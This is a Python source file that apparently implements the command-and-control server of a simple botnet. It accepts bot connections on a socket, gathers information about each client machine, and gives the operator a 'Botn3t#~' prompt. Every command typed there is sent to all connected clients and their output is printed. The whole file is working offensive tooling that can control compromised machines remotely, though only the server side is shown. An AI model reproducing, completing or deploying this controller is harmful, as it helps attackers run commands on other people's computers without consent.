import socket
import threading
import time

#listen for new clients and add it to the client list and also calls the get_hello method to get the information 
#about the client machine this class is multithreaded and always listen for new clients.

class add_cl(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        while True:
            global s
            global cl_list

            self.client, self.addr = s.accept()
            print('=======================================')
            print('got connection from %s:%d'%(self.addr))
            cl_list.append(self.client)
            cl_addr.append(self.addr)

            self.get_hello()


    #this function send a getinfo message to the client and receive the information of the client, also it appends that information to the
    #cl_info list which we can use to get the info back again.

    def get_hello(self):
        global cl_info
        arr = []
        info = ("\nanswer from %s:%d"%self.addr).encode()
        cl_info.append(info)
        data = self.client.recv(20480)
        cl_info.append(data)
        print(data.decode())
        data = self.client.recv(20480)
        cl_info.append(data)
        print(data.decode())


# this class is used to get the data from the shell and send that information to client by creating an new thread for each
# each and every connection and that thread wait for the resposne.

class handler(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def shell(self):
        while True:
            global cl_list
            global cl_addr
            com = input('Botn3t#~')
            
            if com == '':
                continue
            else:    
                for i in range(len(cl_list)):
                    th = send_recv(com, cl_list[i], cl_addr[i])
                    th.run()


    def run(self):
        self.shell()

# this is a mutithreaded class which is used to send commands to the client and wait for the response in a multithreaded fashion.
class send_recv():
    def __init__(self, command, client, addr):
        self.client = client
        self.addr = addr
        self.command = command
        global cl_list
        print (cl_list)

    def run(self):
        self.client.send(self.command.encode())
        out = self.client.recv(20480)
        print('\n \n answer from %s:%d : ====================='%self.addr)
        print(out.decode())
        print("====================================================")    

    
if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    host = '127.0.0.1'
    port = 4567
    cl_list = []
    cl_addr = []
    cl_info = []

    s.bind((host, port))
    s.listen(5)
    #server started Listening
    print("started server on %s:%d"%(host, port))

    n = add_cl()
    n.start()
    h = handler()
    h.start()
    h.join()